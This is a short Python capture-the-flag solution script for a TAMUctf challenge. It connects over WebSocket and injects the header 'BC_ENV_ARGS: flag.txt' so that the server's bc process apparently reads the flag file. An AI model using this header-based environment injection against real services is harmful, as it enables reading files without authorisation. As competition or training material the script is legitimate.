#!/usr/bin/env python3

# pip install websocket_client
import websocket

if __name__ == '__main__':
    ws = websocket.WebSocket()
    ws.connect("ws://challenges.tamuctf.com:3012/", header=["BC_ENV_ARGS: flag.txt"])

    ws.send("1 + 50^50\n")

    result = ws.recv()
    print("Received '%s'" % str(result.decode("utf-8")))
    ws.close()
